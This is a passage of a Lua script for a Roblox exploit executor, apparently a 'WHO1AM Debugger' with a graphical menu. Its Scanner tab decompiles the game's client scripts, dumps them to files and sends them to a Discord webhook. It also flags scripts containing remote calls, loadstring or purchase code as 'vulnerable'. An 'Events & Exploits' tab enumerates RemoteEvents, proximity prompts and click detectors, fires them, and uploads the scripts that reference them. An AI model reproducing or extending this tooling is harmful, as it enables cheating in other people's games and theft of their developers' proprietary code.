SGrad.Rotation = 90
SGrad.Transparency = NumberSequence.new{
    NumberSequenceKeypoint.new(0, 0.8),
    NumberSequenceKeypoint.new(0.5, 1),
    NumberSequenceKeypoint.new(1, 1)
}

local STitle = Instance.new("TextLabel")
STitle.Text = "Server"
STitle.Size = UDim2.new(1, -20, 0, 30)
STitle.Position = UDim2.new(0, 15, 0, 12)
STitle.BackgroundTransparency = 1
STitle.TextColor3 = Color3.fromRGB(255, 255, 255)
STitle.Font = Enum.Font.GothamBold
STitle.TextSize = 16
STitle.TextXAlignment = Enum.TextXAlignment.Left
STitle.Parent = ServerCard

local SDesc = Instance.new("TextLabel")
SDesc.Text = "Information on the session you're currently in"
SDesc.Size = UDim2.new(1, -20, 0, 15)
SDesc.Position = UDim2.new(0, 15, 0, 35)
SDesc.BackgroundTransparency = 1
SDesc.TextColor3 = UIConfig.Colors.SubText
SDesc.Font = Enum.Font.Gotham
SDesc.TextSize = 11
SDesc.TextXAlignment = Enum.TextXAlignment.Left
SDesc.Parent = ServerCard

-- Stats Grid
local StatsGrid = Instance.new("Frame")
StatsGrid.Size = UDim2.new(1, -20, 1, -60)
StatsGrid.Position = UDim2.new(0, 10, 0, 55)
StatsGrid.BackgroundTransparency = 1
StatsGrid.Parent = ServerCard

local GridL = Instance.new("UIGridLayout", StatsGrid)
GridL.CellSize = UDim2.new(0.48, 0, 0, 50) -- Responsive Cell Size
GridL.CellPadding = UDim2.new(0.04, 0, 0, 10)

local function MakeStat(name, valFunc)
    local Box = Instance.new("Frame")
    Box.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
    Box.Parent = StatsGrid
    Instance.new("UICorner", Box).CornerRadius = UDim.new(0, 6)
    
    local T = Instance.new("TextLabel")
    T.Text = name
    T.Size = UDim2.new(1, -10, 0, 15)
    T.Position = UDim2.new(0, 10, 0, 8)
    T.BackgroundTransparency = 1
    T.TextColor3 = Color3.fromRGB(255, 255, 255)
    T.Font = Enum.Font.GothamBold
    T.TextSize = 11
    T.TextXAlignment = Enum.TextXAlignment.Left
    T.Parent = Box
    
    local V = Instance.new("TextLabel")
    V.Text = "..."
    V.Size = UDim2.new(1, -10, 0, 15)
    V.Position = UDim2.new(0, 10, 0, 24)
    V.BackgroundTransparency = 1
    V.TextColor3 = UIConfig.Colors.SubText
    V.Font = Enum.Font.Gotham
    V.TextSize = 10
    V.TextXAlignment = Enum.TextXAlignment.Left
    V.Parent = Box
    
    task.spawn(function()
        while Box.Parent do
            V.Text = valFunc()
            task.wait(1)
        end
    end)
end

MakeStat("Players", function() return #Players:GetPlayers() .. " playing" end)
MakeStat("Max Players", function() return Players.MaxPlayers .. " slots" end)
MakeStat("Time", function() return os.date("%H:%M") end)
MakeStat("Ping", function() return math.floor(LocalPlayer:GetNetworkPing() * 1000) .. "ms" end)

-- Right Column (Executor & Friends)
local RightCol = Instance.new("Frame")
RightCol.Size = UDim2.new(0.45, 0, 1, 0) -- Responsive Width
RightCol.BackgroundTransparency = 1
RightCol.Parent = Home

local RightList = Instance.new("UIListLayout", RightCol)
RightList.Padding = UDim.new(0, 10)

-- Executor Card
local ExecCard = Instance.new("Frame")
ExecCard.Size = UDim2.new(1, 0, 0, 140) -- Increased Height
ExecCard.BackgroundColor3 = UIConfig.Colors.Card
ExecCard.Parent = RightCol
Instance.new("UICorner", ExecCard).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", ExecCard).Color = UIConfig.Colors.Stroke

local EGrad = Instance.new("UIGradient", ExecCard)
EGrad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, UIConfig.Colors.RedStart), ColorSequenceKeypoint.new(1, UIConfig.Colors.Card)}
EGrad.Rotation = -45
EGrad.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0, 0.8), NumberSequenceKeypoint.new(1, 1)}

local ETitle = Instance.new("TextLabel")
ETitle.Text = "Executor Security"
ETitle.Size = UDim2.new(1, -20, 0, 20)
ETitle.Position = UDim2.new(0, 15, 0, 10)
ETitle.BackgroundTransparency = 1
ETitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ETitle.Font = Enum.Font.GothamBold
ETitle.TextSize = 14
ETitle.TextXAlignment = Enum.TextXAlignment.Left
ETitle.Parent = ExecCard

local EDesc = Instance.new("TextLabel")
EDesc.Text = (identifyexecutor and identifyexecutor() or "Unknown Executor")
EDesc.Size = UDim2.new(1, -20, 0, 20)
EDesc.Position = UDim2.new(0, 15, 0, 30)
EDesc.BackgroundTransparency = 1
EDesc.TextColor3 = UIConfig.Colors.SubText
EDesc.Font = Enum.Font.Gotham
EDesc.TextSize = 12
EDesc.TextXAlignment = Enum.TextXAlignment.Left
EDesc.Parent = ExecCard

-- Capabilities Grid
local CapGrid = Instance.new("Frame")
CapGrid.Size = UDim2.new(1, -20, 1, -60)
CapGrid.Position = UDim2.new(0, 10, 0, 55)
CapGrid.BackgroundTransparency = 1
CapGrid.Parent = ExecCard

local CLayout = Instance.new("UIGridLayout", CapGrid)
CLayout.CellSize = UDim2.new(0.45, 0, 0, 30)
CLayout.CellPadding = UDim2.new(0.05, 0, 0, 5)

local Caps = CheckCapabilities()
local function AddCap(name, status)
    local C = Instance.new("Frame")
    C.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
    C.Parent = CapGrid
    Instance.new("UICorner", C).CornerRadius = UDim.new(0, 4)
    
    local N = Instance.new("TextLabel", C)
    N.Text = name
    N.Size = UDim2.new(1, -5, 1, 0) -- Ajustado
    N.Position = UDim2.new(0, 5, 0, 0) -- Ajustado
    N.BackgroundTransparency = 1
    N.TextColor3 = UIConfig.Colors.SubText
    N.Font = Enum.Font.GothamBold
    N.TextSize = 9 -- Reducido un poco para que quepa mejor
    N.TextXAlignment = Enum.TextXAlignment.Left
    
    local S = Instance.new("TextLabel", C)
    S.Text = status
    S.Size = UDim2.new(0, 15, 1, 0)
    S.Position = UDim2.new(1, -20, 0, 0)
    S.BackgroundTransparency = 1
    S.TextSize = 11
    S.Parent = C
end

AddCap("Hooking", Caps.Hooking)
AddCap("Decompiler", Caps.Decompile)
AddCap("Files", Caps.Files) -- Acortado nombre
AddCap("Threads", Caps.Threads)

-- Friends Card
local FriendCard = Instance.new("Frame")
FriendCard.Size = UDim2.new(1, 0, 1, -150) -- Adjusted for taller Executor Card
FriendCard.BackgroundColor3 = UIConfig.Colors.Card
FriendCard.Parent = RightCol
Instance.new("UICorner", FriendCard).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", FriendCard).Color = UIConfig.Colors.Stroke

local FGrad = Instance.new("UIGradient", FriendCard)
FGrad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, UIConfig.Colors.YellowStart), ColorSequenceKeypoint.new(1, UIConfig.Colors.Card)}
FGrad.Rotation = 135
FGrad.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0, 0.9), NumberSequenceKeypoint.new(1, 1)}

local FTitle = Instance.new("TextLabel")
FTitle.Text = "Friends"
FTitle.Size = UDim2.new(1, -20, 0, 20)
FTitle.Position = UDim2.new(0, 15, 0, 10)
FTitle.BackgroundTransparency = 1
FTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
FTitle.Font = Enum.Font.GothamBold
FTitle.TextSize = 14
FTitle.TextXAlignment = Enum.TextXAlignment.Left
FTitle.Parent = FriendCard

-- Friends Status
local FStats = Instance.new("Frame")
FStats.Size = UDim2.new(1, -20, 1, -40)
FStats.Position = UDim2.new(0, 10, 0, 35)
FStats.BackgroundTransparency = 1
FStats.ClipsDescendants = true -- IMPORTANTE: Cortar si se sale
FStats.Parent = FriendCard
local FGrid = Instance.new("UIGridLayout", FStats)
FGrid.CellSize = UDim2.new(0.31, 0, 0, 45) -- 3 Columns
FGrid.CellPadding = UDim2.new(0.02, 0, 0, 0)

local function MakeFriendStat(title, val)
    local B = Instance.new("Frame")
    B.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
    B.Parent = FStats
    Instance.new("UICorner", B).CornerRadius = UDim.new(0, 6)
    local T = Instance.new("TextLabel", B)
    T.Text = title
    T.Size = UDim2.new(1, 0, 0, 15)
    T.Position = UDim2.new(0, 0, 0, 8)
    T.TextColor3 = Color3.fromRGB(255, 255, 255)
    T.BackgroundTransparency = 1
    T.Font = Enum.Font.GothamBold
    T.TextSize = 9 -- Reducido
    local V = Instance.new("TextLabel", B)
    V.Text = val
    V.Size = UDim2.new(1, 0, 0, 15)
    V.Position = UDim2.new(0, 0, 0, 24)
    V.TextColor3 = UIConfig.Colors.SubText
    V.BackgroundTransparency = 1
    V.Font = Enum.Font.Gotham
    V.TextSize = 9 -- Reducido
end
MakeFriendStat("In Server", "0 friends")
MakeFriendStat("Offline", "Unknown")
MakeFriendStat("Online", "Unknown")

-- ============================================================================
-- 🕵️ TAB 2: SCANNER
-- ============================================================================
local Scanner = Win:Tab("Scanner", "rbxassetid://10888331510", 2)
local ScannerScroll = Instance.new("ScrollingFrame")
ScannerScroll.Size = UDim2.new(1, -40, 1, -80) -- Adjusted for two buttons
ScannerScroll.Position = UDim2.new(0, 20, 0, 60)
ScannerScroll.BackgroundTransparency = 1
ScannerScroll.ScrollBarThickness = 2
ScannerScroll.Parent = Scanner

local ScanList = Instance.new("UIListLayout", ScannerScroll)
ScanList.Padding = UDim.new(0, 5)
ScanList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ScannerScroll.CanvasSize = UDim2.new(0, 0, 0, ScanList.AbsoluteContentSize.Y + 10)
end)

local FoundScripts = {} -- Store found scripts for Mass Decompile

local function GetScripts()
    local scripts = {}
    local seen = {}
    -- Removed seenNames to allow different scripts with same name (User request: scan ALL)
    
    local function Add(s)
        -- FILTER: Must exist and have a parent (Actually in game)
        if not s or not s.Parent then return end
        if seen[s] or not (s:IsA("LocalScript") or s:IsA("ModuleScript")) then return end
        
        -- FILTER: Ignore CoreGui / Roblox Internal Stuff
        if s:IsDescendantOf(game:GetService("CoreGui")) or 
           s:IsDescendantOf(game:GetService("CorePackages")) or
           s:IsDescendantOf(game:GetService("Chat")) then return end
        
        -- FILTER: Ignore Other Players (Strict Hierarchy Check)
        -- If it's inside a Player object, it MUST be LocalPlayer
        local rootPlayer = s:FindFirstAncestorWhichIsA("Player")
        if rootPlayer and rootPlayer ~= LocalPlayer then
             return 
        end

        -- FILTER: Ignore Other Characters in Workspace
        -- If it's inside a Model with Humanoid, check if it belongs to another player
        local modelAncestor = s:FindFirstAncestorWhichIsA("Model")
        if modelAncestor and modelAncestor:FindFirstChild("Humanoid") then
            local plr = Players:GetPlayerFromCharacter(modelAncestor)
            if plr and plr ~= LocalPlayer then
                return -- Ignorar scripts de otros jugadores
            end
        end
        
        -- FILTER: Ignore Common Junk (Roblox Defaults)
        local n = s.Name
        if n == "Animate" or n == "Health" or n == "RbxCharacterSounds" or n:find("Bubble") then return end
        if n == "PlayerModule" or n == "CameraModule" or n == "ControlModule" then return end
        
        seen[s] = true
        table.insert(scripts, s)
    end

    -- 1. Executor Globals (Primary source)
    if getscripts then
        pcall(function() for _, s in pairs(getscripts()) do Add(s) end end)
    end
    if getrunningscripts then
        pcall(function() for _, s in pairs(getrunningscripts()) do Add(s) end end)
    end

    -- 2. Broad Service Scan (Scans everything relevant in the server)
    local ServicesToScan = {
        game:GetService("Workspace"),
        game:GetService("ReplicatedFirst"),
        game:GetService("ReplicatedStorage"),
        game:GetService("StarterPack"),
        game:GetService("StarterGui"),
        game:GetService("Lighting"),
        game:GetService("SoundService"),
        game:GetService("Teams"),
        LocalPlayer -- Scans PlayerGui, Backpack, PlayerScripts
    }
    
    for _, service in pairs(ServicesToScan) do
        pcall(function()
            for _, v in pairs(service:GetDescendants()) do
                Add(v)
            end
        end)
    end
    
    FoundScripts = scripts -- Update global list
    return scripts
end

-- Button Container
local BtnContainer = Instance.new("Frame")
BtnContainer.Size = UDim2.new(1, -40, 0, 45)
BtnContainer.Position = UDim2.new(0, 20, 0, 10)
BtnContainer.BackgroundTransparency = 1
BtnContainer.Parent = Scanner

local BtnLayout = Instance.new("UIListLayout", BtnContainer)
BtnLayout.FillDirection = Enum.FillDirection.Horizontal
BtnLayout.SortOrder = Enum.SortOrder.LayoutOrder
BtnLayout.Padding = UDim.new(0, 10)

-- Scan Button
local ScanBtn = Instance.new("TextButton")
ScanBtn.Text = "🔄 Scan"
ScanBtn.Size = UDim2.new(0.24, 0, 1, 0) -- Adjusted for 4 buttons
ScanBtn.BackgroundColor3 = UIConfig.Colors.Card
ScanBtn.TextColor3 = UIConfig.Colors.Text
ScanBtn.Font = Enum.Font.GothamBold
ScanBtn.TextSize = 10
ScanBtn.Parent = BtnContainer
Instance.new("UICorner", ScanBtn).CornerRadius = UDim.new(0, 8)

-- Vulnerability Scan Button (NEW)
local VulnBtn = Instance.new("TextButton")
VulnBtn.Text = "☣️ Vuln"
VulnBtn.Size = UDim2.new(0.24, 0, 1, 0)
VulnBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50) -- Red for danger
VulnBtn.TextColor3 = UIConfig.Colors.Text
VulnBtn.Font = Enum.Font.GothamBold
VulnBtn.TextSize = 10
VulnBtn.Parent = BtnContainer
Instance.new("UICorner", VulnBtn).CornerRadius = UDim.new(0, 8)

-- AI Button (REPLACED WITH DOWNLOAD ALL)
local AIBtn = Instance.new("TextButton")
AIBtn.Text = "📥 Dump"
AIBtn.Size = UDim2.new(0.24, 0, 1, 0)
AIBtn.BackgroundColor3 = UIConfig.Colors.GreenEnd
AIBtn.TextColor3 = UIConfig.Colors.Text
AIBtn.Font = Enum.Font.GothamBold
AIBtn.TextSize = 10
AIBtn.Parent = BtnContainer
Instance.new("UICorner", AIBtn).CornerRadius = UDim.new(0, 8)
local AIGradient = Instance.new("UIGradient", AIBtn)
AIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, UIConfig.Colors.GreenStart),
    ColorSequenceKeypoint.new(1, UIConfig.Colors.GreenEnd)
}

-- Clear Button (NEW)
local ClearBtn = Instance.new("TextButton")
ClearBtn.Text = "🧹 Clear"
ClearBtn.Size = UDim2.new(0.15, 0, 1, 0) -- Smaller
ClearBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
ClearBtn.TextColor3 = UIConfig.Colors.Text
ClearBtn.Font = Enum.Font.GothamBold
ClearBtn.TextSize = 10
ClearBtn.Parent = BtnContainer
Instance.new("UICorner", ClearBtn).CornerRadius = UDim.new(0, 8)

ClearBtn.MouseButton1Click:Connect(function()
    for _, c in pairs(ScannerScroll:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    FoundScripts = {}
    Win:Notify("Cleared", "Scanner results cleared.", 2)
end)

-- VULNERABILITY SCANNER LOGIC
VulnBtn.MouseButton1Click:Connect(function()
    if #FoundScripts == 0 then
        VulnBtn.Text = "⚠️ Scan First!"
        task.wait(2)
        VulnBtn.Text = "☣️ Vuln Scan"
        return
    end

    -- Clear List
    for _, c in pairs(ScannerScroll:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    
    VulnBtn.Text = "⏳ Searching..."
    
    local SuspiciousPatterns = {
        "FireServer", "InvokeServer", "Kick", "Ban", "Require", 
        "loadstring", "os.time", "tick", "TeleportService", "HttpService", 
        "MarketplaceService", "Purchase", "Robux", "Leaderstats"
    }
    
    local VulnFound = 0
    
    for i, s in pairs(FoundScripts) do
        UpdateConsoleProgress(i, #FoundScripts, "Vulnerability Scan")
        
        -- Try to decompile
        local success, src = pcall(function() return decompile(s) end)
        
        if success and src then
            local hits = {}
            for _, pattern in ipairs(SuspiciousPatterns) do
                if src:find(pattern) then
                    table.insert(hits, pattern)
                end
            end
            
            if #hits > 0 then
                VulnFound = VulnFound + 1
                
                local Item = Instance.new("TextButton")
                Item.Size = UDim2.new(1, 0, 0, 45) -- Taller for details
                Item.BackgroundColor3 = Color3.fromRGB(40, 20, 20) -- Reddish tint
                Item.Text = "  🚨 " .. s.Name .. " [" .. table.concat(hits, ", ") .. "]"
                Item.TextColor3 = Color3.fromRGB(255, 100, 100)
                Item.TextXAlignment = Enum.TextXAlignment.Left
                Item.Font = Enum.Font.Code
                Item.TextSize = 11
                Item.TextWrapped = true
                Item.Parent = ScannerScroll
                Instance.new("UICorner", Item).CornerRadius = UDim.new(0, 4)
                
                Item.MouseButton1Click:Connect(function()
                     setclipboard(src)
                     Win:Notify("Copied", "Vulnerable script copied to clipboard!", 3)
                end)
            end
        end
        
        if i % 10 == 0 then task.wait() end -- Anti-freeze
    end
    
    VulnBtn.Text = "☣️ Vuln Scan"
    Win:Notify("Scan Complete", "Found " .. VulnFound .. " suspicious scripts.", 5)
end)

AIBtn.MouseButton1Click:Connect(function()
    if #FoundScripts == 0 then
        AIBtn.Text = "⚠️ Scan First!"
        task.wait(2)
        AIBtn.Text = "📥 Download All Scripts"
        return
    end
    
    AIBtn.Text = "📦 Initializing..."
    local CombinedContent = "-- MASS DUMP GENERATED BY WHO1AM DEBUGGER\n"
    CombinedContent = CombinedContent .. "-- Game ID: " .. game.PlaceId .. "\n"
    CombinedContent = CombinedContent .. "-- Date: " .. os.date() .. "\n"
    CombinedContent = CombinedContent .. "-- Total Scripts: " .. #FoundScripts .. "\n\n"
    
    for i, s in pairs(FoundScripts) do
        AIBtn.Text = "📦 Dump: " .. i .. "/" .. #FoundScripts
        UpdateConsoleProgress(i, #FoundScripts, "Script Dump Progress")
        
        -- Anti-Crash Yield (Aggressive)
        task.wait() 
        if i % 20 == 0 then 
            -- Safely attempt GC if allowed, otherwise ignore
            pcall(function() 
                if gcinfo then gcinfo() end 
                if collectgarbage then collectgarbage("count") end
            end)
        end
        
        local success, src = pcall(function() return decompile(s) end)
        if success and src then
            CombinedContent = CombinedContent .. string.rep("=", 50) .. "\n"
            CombinedContent = CombinedContent .. "-- PATH: " .. s:GetFullName() .. "\n"
            CombinedContent = CombinedContent .. string.rep("=", 50) .. "\n"
            CombinedContent = CombinedContent .. src .. "\n\n"
        else
            CombinedContent = CombinedContent .. "-- [FAILED TO DECOMPILE]: " .. s:GetFullName() .. "\n\n"
        end
    end
    
    -- Append ASCII Art Footer
    CombinedContent = CombinedContent .. "\n\n" .. GetAsciiArt()
    
    local FileName = "{SCRIPTS} GAME ID " .. game.PlaceId .. ".txt"
    writefile(FileName, CombinedContent)
    
    -- Send Notification to Discord (Don't upload file - Too Large)
    if SendToDiscord then
        if GlobalConfig.WebhookURL and GlobalConfig.WebhookURL:find("http") then
            AIBtn.Text = "📤 NOTIFYING DISCORD..."
            task.spawn(function()
                SendToDiscord("📦 MASS SCRIPT DUMP COMPLETE", "The script dump file is too large to send via Webhook.\n\n📁 **Saved to Workspace:**\n`" .. FileName .. "`\n\n✅ **Status:** Saved Locally", 16776960)
            end)
            task.wait(1.5)
            AIBtn.Text = "✅ DUMP SAVED LOCALLY!"
        else
             AIBtn.Text = "⚠️ SAVED (NO WEBHOOK)"
             task.wait(1.5)
        end
    else
        AIBtn.Text = "✅ DUMP SAVED!"
    end
    
    task.wait(2)
    AIBtn.Text = "📥 Download All Scripts"
    
    AIBtn.Text = "✅ Saved to Workspace!"
    Win:Notify("Dump Complete", "Saved all scripts to Workspace & Sent to Discord.", 5)
    task.wait(3)
    AIBtn.Text = "📥 Download All Scripts"
end)

ScanBtn.MouseButton1Click:Connect(function()
    -- Clear old results
    for _, c in pairs(ScannerScroll:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    
    ScanBtn.Text = "Scanning..."
    task.wait(0.1)
    
    local found = GetScripts()
    local count = 0
    local totalFound = #found
    
    for _, s in pairs(found) do
        count = count + 1
        local Item = Instance.new("TextButton")
        Item.Size = UDim2.new(1, 0, 0, 30)
        Item.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        Item.Text = "  📄 " .. s.Name
        Item.TextColor3 = UIConfig.Colors.SubText
        Item.TextXAlignment = Enum.TextXAlignment.Left
        Item.Font = Enum.Font.Code
        Item.TextSize = 12
        Item.Parent = ScannerScroll
        Instance.new("UICorner", Item).CornerRadius = UDim.new(0, 4)
        
        local processing = false
        Item.MouseButton1Click:Connect(function()
            if processing then return end
            processing = true
            
            task.spawn(function()
                Item.Text = "  ⏳ Decompiling..."
                Item.TextColor3 = Color3.fromRGB(255, 200, 50)
                task.wait(0.1) -- Force UI Update

                local success, result = pcall(function()
                    return decompile(s)
                end)
                
                if success and result and #result > 0 then
                    task.wait() -- Breath
                    
                    -- 1. Copy to Clipboard (Protected)
                    local finalContent = "-- " .. s:GetFullName() .. "\n" .. result
                    pcall(function() setclipboard(finalContent) end)
                    
                    task.wait() -- Breath
                    
                    -- 2. Save to Workspace
                    local safeName = s.Name:gsub("[^%w%-_]", "_")
                    local fileName = "Decompiled_" .. safeName .. "_" .. os.time() .. ".txt"
                    pcall(function() writefile(fileName, finalContent) end)

                    task.wait() -- Breath before Network
                    
                    -- 3. Send to Discord
                    -- Run in separate thread so it doesn't block UI feedback
                    task.spawn(function()
                        SendFileToDiscord("📄 SCRIPT DECOMPILED", "Script: " .. s:GetFullName(), 16776960, fileName, finalContent)
                    end)
                    
                    Item.Text = "  ✅ Copied & Sent!"
                    Item.TextColor3 = UIConfig.Colors.GreenStart
                    Win:Notify("Decompiled", "Script copied to clipboard & sent to Discord.", 3)
                    
                    -- Memory Cleanup
                    finalContent = nil
                    result = nil
                else
                    Item.Text = "  ❌ Failed / Protected"
                    Item.TextColor3 = UIConfig.Colors.RedStart
                    warn("[Decompile Fail] " .. s:GetFullName())
                end
                
                task.wait(2)
                if Item and Item.Parent then
                    Item.Text = "  📄 " .. s.Name
                    Item.TextColor3 = UIConfig.Colors.SubText
                end
                processing = false
            end)
        end)
        
        if count > 2000 then break end -- Limit list size
        -- Optimized UI Loop: Wait every 20 items instead of 100
        if count % 20 == 0 then task.wait() end
    end
    ScanBtn.Text = "🔄 Scan Scripts (" .. totalFound .. ")"
end)



-- ============================================================================
-- 💀 TAB 3: EVENTS & EXPLOITS (NEW - DARK HACKER FLOW)
-- ============================================================================
local EventsTab = Win:Tab("Events", "⚡", 3)

-- [STYLES & UTILS]
local function GenerateDarkHeader(text)
    local line = string.rep("═", 60)
    return string.format("╔%s╗\n║ %-58s ║\n╚%s╝", line, text, line)
end

local function GenerateDarkSection(title)
    return "\n" .. string.rep("░", 20) .. " " .. title .. " " .. string.rep("░", 20) .. "\n"
end

-- [DATA STORAGE]
local ScannedObjects = {}

-- [SCANNER LOGIC]
local function ScanForEvents()
    local found = {}
    
    -- 1. Scan Remotes
    local function ScanRemotes(parent)
        for _, v in pairs(parent:GetDescendants()) do
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                table.insert(found, {Type = "Remote", Obj = v})
            elseif v:IsA("ProximityPrompt") then
                table.insert(found, {Type = "Prompt", Obj = v})
            elseif v:IsA("ClickDetector") then
                table.insert(found, {Type = "Click", Obj = v})
            end
        end
    end
    
    -- Targets: ReplicatedStorage, Workspace, StarterGui, etc.
    pcall(function() ScanRemotes(game:GetService("ReplicatedStorage")) end)
    pcall(function() ScanRemotes(game:GetService("Workspace")) end)
    pcall(function() ScanRemotes(game:GetService("StarterGui")) end)
    
    return found
end

-- [CROSS-REFERENCE LOGIC]
-- Finds scripts that reference the given object name
-- OPTIMIZED: Now takes a pre-computed cache of decompiled sources
local function FindReferencingScripts(targetObj, scriptCache)
    local refs = {}
    local targetName = targetObj.Name
    
    if not scriptCache then return refs end

    for s, src in pairs(scriptCache) do
        if src and src:find(targetName) then
            table.insert(refs, {Script = s, Source = src})
        end
    end
    
    return refs
end

-- [UI CONSTRUCTION]
local EventContainer = Instance.new("ScrollingFrame")
EventContainer.Size = UDim2.new(1, -40, 1, -80)
EventContainer.Position = UDim2.new(0, 20, 0, 60)
EventContainer.BackgroundTransparency = 1
EventContainer.ScrollBarThickness = 2
EventContainer.Parent = EventsTab

local EventList = Instance.new("UIListLayout", EventContainer)
EventList.Padding = UDim.new(0, 5)
EventList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    EventContainer.CanvasSize = UDim2.new(0, 0, 0, EventList.AbsoluteContentSize.Y + 10)
end)

-- Buttons
local BtnHolder = Instance.new("Frame")
BtnHolder.Size = UDim2.new(1, -40, 0, 45)
BtnHolder.Position = UDim2.new(0, 20, 0, 10)
BtnHolder.BackgroundTransparency = 1
BtnHolder.Parent = EventsTab

local BtnLayout = Instance.new("UIListLayout", BtnHolder)
BtnLayout.FillDirection = Enum.FillDirection.Horizontal
BtnLayout.Padding = UDim.new(0, 10)

local ScanEvtBtn = Instance.new("TextButton")
ScanEvtBtn.Text = "☠️ SCAN"
ScanEvtBtn.Size = UDim2.new(0.40, 0, 1, 0) -- Adjusted
ScanEvtBtn.BackgroundColor3 = UIConfig.Colors.Card
ScanEvtBtn.TextColor3 = UIConfig.Colors.RedStart
ScanEvtBtn.Font = Enum.Font.GothamBold
ScanEvtBtn.TextSize = 11
ScanEvtBtn.Parent = BtnHolder
Instance.new("UICorner", ScanEvtBtn).CornerRadius = UDim.new(0, 8)

local DumpEvtBtn = Instance.new("TextButton")
DumpEvtBtn.Text = "💾 DUMP ALL"
DumpEvtBtn.Size = UDim2.new(0.40, 0, 1, 0) -- Adjusted
DumpEvtBtn.BackgroundColor3 = UIConfig.Colors.Card
DumpEvtBtn.TextColor3 = UIConfig.Colors.Text
DumpEvtBtn.Font = Enum.Font.GothamBold
DumpEvtBtn.TextSize = 11
DumpEvtBtn.Parent = BtnHolder
Instance.new("UICorner", DumpEvtBtn).CornerRadius = UDim.new(0, 8)

-- Clear Button (NEW)
local ClearEvtBtn = Instance.new("TextButton")
ClearEvtBtn.Text = "🧹 Clear"
ClearEvtBtn.Size = UDim2.new(0.15, 0, 1, 0) -- Smaller
ClearEvtBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
ClearEvtBtn.TextColor3 = UIConfig.Colors.Text
ClearEvtBtn.Font = Enum.Font.GothamBold
ClearEvtBtn.TextSize = 10
ClearEvtBtn.Parent = BtnHolder
Instance.new("UICorner", ClearEvtBtn).CornerRadius = UDim.new(0, 8)

ClearEvtBtn.MouseButton1Click:Connect(function()
    for _, c in pairs(EventContainer:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    ScannedObjects = {}
    Win:Notify("Cleared", "Event logs cleared.", 2)
end)

-- [ACTIONS]
ScanEvtBtn.MouseButton1Click:Connect(function()
    -- Clear UI
    for _, c in pairs(EventContainer:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    
    ScanEvtBtn.Text = "Scanning..."
    task.wait(0.1)
    
    ScannedObjects = ScanForEvents()
    
    for _, item in pairs(ScannedObjects) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, 0, 0, 30)
        btn.BackgroundColor3 = Color3.fromRGB(25, 20, 25) -- Darker red tint
        
        local icon = "📡"
        if item.Type == "Prompt" then icon = "👋" end
        if item.Type == "Click" then icon = "🖱️" end
        
        btn.Text = "  " .. icon .. " " .. item.Obj.Name .. " [" .. item.Type .. "]"
        btn.TextColor3 = UIConfig.Colors.SubText
        btn.TextXAlignment = Enum.TextXAlignment.Left
        btn.Font = Enum.Font.Code
        btn.TextSize = 12
        btn.Parent = EventContainer
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
        
        -- Click Action (Left: Trigger/Copy, Right: Force Copy)
        btn.MouseButton1Click:Connect(function()
             if item.Type == "Prompt" and fireproximityprompt then
                 fireproximityprompt(item.Obj)
                 btn.Text = "  🔥 TRIGGERED!"
                 btn.TextColor3 = UIConfig.Colors.GreenStart
             elseif item.Type == "Click" and fireclickdetector then
                 fireclickdetector(item.Obj)
                 btn.Text = "  🔥 CLICKED!"
                 btn.TextColor3 = UIConfig.Colors.GreenStart
             else
                 local path = item.Obj:GetFullName()
                 setclipboard(path)
                 btn.Text = "  ✅ Path Copied!"
                 btn.TextColor3 = UIConfig.Colors.GreenStart
                 
                 -- LOG TO DISCORD (NEW)
                 task.spawn(function()
                     SendToDiscord("📋 EVENT PATH COPIED", "Path: `" .. path .. "`\nType: `" .. item.Type .. "`\n\n🔍 Searching for associated script...", 16753920)
                     
                     -- Search for referencing scripts
                     local foundScript, foundSrc = nil, nil
                     
                     -- 1. Check Global Cache
                     for s, src in pairs(GlobalScriptCache) do
                        if src:find(item.Obj.Name) then
                            foundScript, foundSrc = s, src
                            break
                        end
                     end
                     
                     -- 2. Deep Scan if not in cache
                     if not foundScript then
                         local scripts = (getrunningscripts and getrunningscripts()) or game:GetService("Players").LocalPlayer:GetDescendants()
                         for _, s in pairs(scripts) do
                             if s:IsA("LocalScript") or s:IsA("ModuleScript") then
                                 if not GlobalScriptCache[s] then
                                     local success, src = pcall(function() return decompile(s) end)
                                     if success and src then
                                         GlobalScriptCache[s] = src -- Cache it
                                         if src:find(item.Obj.Name) then
                                             foundScript, foundSrc = s, src
                                             break
                                         end
                                     end
                                     task.wait() -- Prevent lag during deep scan
                                 end
                             end
                         end
                     end
                     
                     if foundScript then
                         SendFileToDiscord("🔗 SCRIPT FOUND", "Script: `" .. foundScript:GetFullName() .. "`\nThis script references the event!", 65280, foundScript.Name .. ".lua", foundSrc)
                     else
                         SendToDiscord("❌ NO SCRIPT FOUND", "Could not find any active script referencing `" .. item.Obj.Name .. "` in the source code.", 16711680)
                     end
                 end)
             end
             
             task.wait(1)
             btn.Text = "  " .. icon .. " " .. item.Obj.Name .. " [" .. item.Type .. "]"
             btn.TextColor3 = UIConfig.Colors.SubText
        end)

        btn.MouseButton2Click:Connect(function()
             local path = item.Obj:GetFullName()
             setclipboard(path)
             btn.Text = "  ✅ Path Copied!"
             
             -- LOG TO DISCORD (NEW)
             task.spawn(function()
